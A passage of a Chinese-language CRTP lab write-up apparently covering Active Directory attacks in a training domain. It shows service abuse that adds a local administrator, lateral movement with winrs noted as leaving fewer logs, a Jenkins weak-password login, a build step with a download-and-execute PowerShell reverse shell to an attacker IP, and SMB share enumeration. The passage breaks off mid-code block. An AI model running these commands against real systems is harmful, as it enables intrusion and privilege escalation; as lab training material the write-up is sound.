<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-Name</span> <span class="string">&#x27;AbyssWebServer&#x27;</span> <span class="literal">-UserName</span> dcorp\student522</span><br><span class="line"></span><br><span class="line">ServiceAbused  Command</span><br><span class="line"><span class="literal">-------------</span>  <span class="literal">-------</span></span><br><span class="line">AbyssWebServer net user student522 Password123! /add &amp;&amp; net localgroup Administrators student522 /add</span><br></pre></td></tr></table></figure>

<p>直接用域名的话也是ok 不过会长一些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-Name</span> <span class="string">&#x27;AbyssWebServer&#x27;</span> <span class="literal">-UserName</span> dollarcorp\student522</span><br><span class="line"></span><br><span class="line">ServiceAbused  Command</span><br><span class="line"><span class="literal">-------------</span>  <span class="literal">-------</span></span><br><span class="line">AbyssWebServer net localgroup Administrators dollarcorp\student522 /add</span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-5-1"><a href="#Learning-Objective-5-1" class="headerlink" title="Learning Objective - 5	- 1"></a>Learning Objective - 5	- 1</h2><blockquote>
<p>Script used for hunting for admin privileges using PowerShell Remoting</p>
</blockquote>
<blockquote>
<p>用于通过 PowerShell 远程搜索管理员权限的脚本</p>
</blockquote>
<p>直接用 <code>Find-LocalAdminaccess</code> 看看当前用户在域里哪些机器是本地管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Find-LocalAdminaccess</span> <span class="literal">-Verbose</span></span><br><span class="line">VERBOSE: [<span class="built_in">Find-LocalAdminAccess</span>] Querying computers <span class="keyword">in</span> the domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://DCORP<span class="literal">-DC</span>.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Invoke-LDAPQuery</span>] <span class="keyword">filter</span> string: (&amp;(samAccountType=<span class="number">805306369</span>))</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainComputer</span>] Error disposing of the Results object: Method invocation failed because [<span class="type">System.DirectoryServices.SearchResult</span>] does not contain a method named <span class="string">&#x27;dispose&#x27;</span>.</span><br><span class="line">VERBOSE: [<span class="built_in">Find-LocalAdminAccess</span>] TargetComputers length: <span class="number">28</span></span><br><span class="line">VERBOSE: [<span class="built_in">Find-LocalAdminAccess</span>] <span class="keyword">Using</span> threading with threads: 20</span><br><span class="line">VERBOSE: [<span class="built_in">New-ThreadedFunction</span>] Total number of hosts: <span class="number">28</span></span><br><span class="line">VERBOSE: [<span class="built_in">New-ThreadedFunction</span>] Total number of threads/partitions: <span class="number">20</span></span><br><span class="line">VERBOSE: [<span class="built_in">New-ThreadedFunction</span>] Threads executing</span><br><span class="line">dcorp<span class="literal">-adminsrv</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>能看到是当前用户在 <code>dcorp-adminsrv.dollarcorp.moneycorp.local</code> 是本地管理员权限</p>
<p>也可以用别的，比如 <code>Find-WMILocalAdminAccess.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; . .\<span class="built_in">Find-WMILocalAdminAccess</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Find-WMILocalAdminAccess</span></span><br><span class="line"></span><br><span class="line">SystemDirectory : C:\Windows\system32</span><br><span class="line">Organization    :</span><br><span class="line">BuildNumber     : <span class="number">20348</span></span><br><span class="line">RegisteredUser  : Windows User</span><br><span class="line">SerialNumber    : <span class="number">00454</span><span class="literal">-80000-00000-AA677</span></span><br><span class="line">Version         : <span class="number">10.0</span>.<span class="number">20348</span></span><br><span class="line"></span><br><span class="line">The current user has Local Admin access on: dcorp<span class="literal">-adminsrv</span>.dollarcorp.moneycorp.local</span><br><span class="line">SystemDirectory : C:\Windows\system32</span><br><span class="line">Organization    :</span><br><span class="line">BuildNumber     : <span class="number">20348</span></span><br><span class="line">RegisteredUser  : Windows User</span><br><span class="line">SerialNumber    : <span class="number">00454</span><span class="literal">-30000-00000-AA239</span></span><br><span class="line">Version         : <span class="number">10.0</span>.<span class="number">20348</span></span><br><span class="line"></span><br><span class="line">The current user has Local Admin access on: dcorp<span class="literal">-std522</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>或者 <code>Find-PSRemotingLocalAdminAccess.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; . .\<span class="built_in">Find-PSRemotingLocalAdminAccess</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Find-PSRemotingLocalAdminAccess</span></span><br><span class="line">dcorp<span class="literal">-adminsrv</span></span><br></pre></td></tr></table></figure>

<p>既然在<code>dcorp-adminsrv</code> 有本地管理员权限，就可以 <code>Enter-PSSession</code> 过去了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> dcorp<span class="literal">-adminsrv</span></span><br><span class="line">[<span class="type">dcorp</span>-<span class="type">adminsrv</span>]: <span class="built_in">PS</span> C:\Users\student522\Documents&gt; <span class="variable">$env:username</span></span><br><span class="line">student522</span><br><span class="line">[<span class="type">dcorp</span>-<span class="type">adminsrv</span>]: <span class="built_in">PS</span> C:\Users\student522\Documents&gt; <span class="variable">$env:computername</span></span><br><span class="line">DCORP<span class="literal">-ADMINSRV</span></span><br></pre></td></tr></table></figure>

<p>不过为了不留下日志这里也可以用 <code>winrs</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; winrs <span class="literal">-r</span>:dcorp<span class="literal">-adminsrv</span> cmd</span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.20348.2762</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\student522&gt;<span class="built_in">set</span> username</span><br><span class="line"><span class="built_in">set</span> username</span><br><span class="line">USERNAME=student522</span><br><span class="line"></span><br><span class="line">C:\Users\student522&gt;<span class="built_in">set</span> computername</span><br><span class="line"><span class="built_in">set</span> computername</span><br><span class="line">COMPUTERNAME=DCORP<span class="literal">-ADMINSRV</span></span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-5-2"><a href="#Learning-Objective-5-2" class="headerlink" title="Learning Objective - 5 - 2"></a>Learning Objective - 5 - 2</h2><blockquote>
<p>Jenkins user used to access Jenkins web console</p>
</blockquote>
<blockquote>
<p>使用 Jenkins 用户登录 （dcorp-ci）jenkins控制台</p>
</blockquote>
<p>在 <code>http://172.16.3.11:8080</code> 上有个jenkins，这个存在未授权的信息泄露。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-3.png" alt="alt text"></p>
<p>能看到目前可用的节点</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-4.png" alt="alt text"></p>
<p>然后返回主页，点击people处，可以看到目前的用户</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-5.png" alt="alt text"></p>
<p>通过用户名弱口令 <code>builduser\builduser</code> 登录</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-6.png" alt="alt text"></p>
<p><img src="/wpimages/2025/crtp-lab-note/image-7.png" alt="alt text"></p>
<h2 id="Learning-Objective-5-3"><a href="#Learning-Objective-5-3" class="headerlink" title="Learning Objective - 5 - 3"></a>Learning Objective - 5 - 3</h2><blockquote>
<p>Domain user used for running Jenkins service on dcorp-ci</p>
</blockquote>
<blockquote>
<p>在dcorp-ci上运行Jenkins服务的用户？</p>
</blockquote>
<p>要用jenkins拿个shell了</p>
<p>选择一个project 点击 <code>Configure</code> 修改它的配置</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-9.png" alt="alt text"></p>
<p>在step中添加build过程中执行的命令</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-8.png" alt="alt text"></p>
<p>起个俩监听，让他一会加载ps，以及接shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-11.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 10086</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-12.png" alt="alt text"></p>
<p>让他弹个 <code>dcirp-ci</code>的shell</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-14.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">iex</span>(<span class="built_in">iwr</span> http://<span class="number">172.16</span>.<span class="number">100.22</span>:<span class="number">8080</span>/<span class="built_in">Invoke-PowerShellTcp</span>.ps1 <span class="literal">-UseBasicParsing</span>);Power <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">100.22</span> <span class="literal">-Port</span> <span class="number">10086</span></span><br></pre></td></tr></table></figure>

<p>保存后 <code>build now</code> 执行</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-13.png" alt="alt text"></p>
<p>拿到 <code>DCORP-CI</code> shell ，用户是 <code>ciadmin</code> </p>
<p><img src="/wpimages/2025/crtp-lab-note/image-10.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\.jenkins\workspace\Project0&gt; <span class="built_in">set</span> username</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\.jenkins\workspace\Project0&gt; <span class="variable">$env:username</span></span><br><span class="line">ciadmin</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\.jenkins\workspace\Project0&gt; <span class="variable">$env:computername</span></span><br><span class="line">DCORP<span class="literal">-CI</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\.jenkins\workspace\Project0&gt;</span><br></pre></td></tr></table></figure>

<p>然后再查一下服务启动的用户 <code>SERVICE_START_NAME</code> 得到 <code>ciadmin</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\.jenkins\workspace\Project0&gt; cmd /c <span class="built_in">sc</span> qc jenkins</span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: jenkins</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : <span class="number">1</span>   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : <span class="string">&quot;C:\Users\Administrator\.jenkins\jenkins.exe&quot;</span></span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : <span class="number">0</span></span><br><span class="line">        DISPLAY_NAME       : jenkins</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : dcorp\ciadmin</span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-6-1"><a href="#Learning-Objective-6-1" class="headerlink" title="Learning Objective - 6 - 1"></a>Learning Objective - 6 - 1</h2><blockquote>
<p>Name of the Group Policy attribute that is modified</p>
</blockquote>
<blockquote>
<p>这里能够被修改（滥用）的组策略的属性</p>
</blockquote>
<p><strong>这里有些跳脱，但其实要先枚举共享文件夹</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">import-module</span> .\PowerHuntShares.psm1</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt;  <span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-NoPing</span> <span class="literal">-OutputDirectory</span> C:\AD\Tools\</span><br><span class="line"> ===============================================================</span><br><span class="line"> <span class="built_in">INVOKE-HUNTSMBSHARES</span></span><br><span class="line"> ===============================================================</span><br><span class="line">  This <span class="function"><span class="keyword">function</span> <span class="title">automates</span> <span class="title">the</span> <span class="title">following</span> <span class="title">tasks</span>:</span></span><br><span class="line"></span><br><span class="line">  o Determine current computer<span class="string">&#x27;s domain</span></span><br><span class="line"><span class="string">  o Enumerate domain computers</span></span><br><span class="line"><span class="string">  o Check if computers respond to ping requests</span></span><br><span class="line"><span class="string">  o Filter for computers that have TCP 445 open and accessible</span></span><br><span class="line"><span class="string">  o Enumerate SMB shares</span></span><br><span class="line"><span class="string">  o Enumerate SMB share permissions</span></span><br><span class="line"><span class="string">  o Identify shares with potentially excessive privielges</span></span><br><span class="line"><span class="string">  o Identify shares that provide read or write access</span></span><br><span class="line"><span class="string">  o Identify shares thare are high risk</span></span><br><span class="line"><span class="string">  o Identify common share owners, names, &amp; directory listings</span></span><br><span class="line"><span class="string">  o Generate last written &amp; last accessed timelines</span></span><br><span class="line"><span class="string">  o Generate html summary report and detailed csv files</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Note: This can take hours to run in large environments.</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> SHARE DISCOVERY</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Scan Start</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Output Directory: C:\AD\Tools\\SmbShareHunt-05232025033642</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Successful connection to domain controller: dcorp-dc.dollarcorp.moneycorp.local</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Performing LDAP query for computers associated with the dollarcorp.moneycorp.local domain</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 28 computers found</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 0 subnets found</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - Skipping ping scan.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Checking if TCP Port 445 is open on 28 computers</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 28 computers have TCP port 445 open.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Getting a list of SMB shares from 28 computers</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 109 SMB shares were found.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Getting share permissions from 109 SMB shares</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 83 share permissions were enumerated.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Identifying potentially excessive share permissions</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - 23 potentially excessive privileges were found on 7 shares across 5 systems.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] Getting directory listings from 7 SMB shares</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:36] - Targeting up to 3 nested directory levels</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 29 files and folders were enumerated.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Scan Complete</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> SHARE ANALYSIS</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Analysis Start</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 7 shares can be read across 5 systems.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 shares can be written to across 5 systems.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 10 shares are considered non-default across 6 systems.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 4 shares are considered high risk across 2 systems.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified top 200 owners of excessive shares.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified top 200 share groups.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified top 200 share names.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified shares created in last 90 days.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified shares accessed in last 90 days.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified shares modified in last 90 days.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - Identified 4 subnets hosting shares configured with excessive privileges.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Finding interesting files...</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Grabbing secrets for parsing...</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Creating ShareGraph nodes and edges...</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Analysis Complete</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> SHARE REPORT SUMMARY</span></span><br><span class="line"><span class="string"> ---------------------------------------------------------------</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Domain: dollarcorp.moneycorp.local</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Start time: 05/23/2025 03:36:42</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] End time: 05/23/2025 03:37:09</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] Run time: 00:00:26.8567284</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] COMPUTER SUMMARY</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 28 domain computers found.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 0 (0.00%) domain computers responded to ping. (No Ping)</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 28 (100.00%) domain computers had TCP port 445 accessible.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 6 (21.43%) domain computers had shares that were non-default.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 (17.86%) domain computers had shares with potentially excessive privileges.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 (17.86%) domain computers had shares that allowed READ access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 (17.86%) domain computers had shares that allowed WRITE access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 2 (7.14%) domain computers had shares that are HIGH RISK.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] SHARE SUMMARY</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 109 shares were found. We expect a minimum of 56 shares</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   because 28 systems had open ports and there are typically two default shares.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 10 (9.17%) shares across 6 systems were non-default.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 7 (6.42%) shares across 5 systems are configured with 23 potentially excessive ACLs.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 7 (6.42%) shares across 5 systems allowed READ access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 (4.59%) shares across 5 systems allowed WRITE access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 4 (3.67%) shares across 2 systems are considered HIGH RISK.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] SHARE ACL SUMMARY</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 83 ACLs were found.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 83 (100.00%) ACLs were associated with non-default shares.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 23 (27.71%) ACLs were found to be potentially excessive.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 13 (15.66%) ACLs were found that allowed READ access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 5 (6.02%) ACLs were found that allowed WRITE access.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 10 (12.05%) ACLs were found that are associated with HIGH RISK share names.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - The most common share names are:</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37] - 7 of 7 (100.00%) discovered shares are associated with the top 200 share names.</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - 2 ADMIN$</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - 2 C$</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - 1 stdx-gp</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - 1 stdadmin-gp</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - 1 AI</span></span><br><span class="line"><span class="string"> [*] -----------------------------------------------</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - Generating HTML Report</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - Estimated generation time: 1 minute or less</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - All files written to C:\AD\Tools\\SmbShareHunt-05232025033642</span></span><br><span class="line"><span class="string"> [*][05/23/2025 03:37]   - Done.</span></span><br></pre></td></tr></table></figure>

<p>收集完有个html可以看</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-15.png" alt="alt text"></p>
<p>因为他走的公网的来加载js，所以得有网才能看</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-16.png" alt="alt text"></p>
<p>能看到 其中只要是个users就对于<code>dcorp-ci</code>  的 <code>AI</code> 文件夹有文件的写入权限</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-18.png" alt="alt text"></p>
<p>到图标搜 <code>dcorp-ci</code> 更是everyone都有权限</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-17.png" alt="alt text"></p>
<p>所以可以访问看下其中的文件 <code>AI.log</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">cd</span> \\dcorp<span class="literal">-ci</span>\ai</span><br><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\dcorp<span class="literal">-ci</span>\ai&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\dcorp<span class="literal">-ci</span>\ai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>          <span class="number">1</span>/<span class="number">6</span>/<span class="number">2025</span>  <span class="number">12</span>:<span class="number">22</span> AM           <span class="number">3332</span> AI.log</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 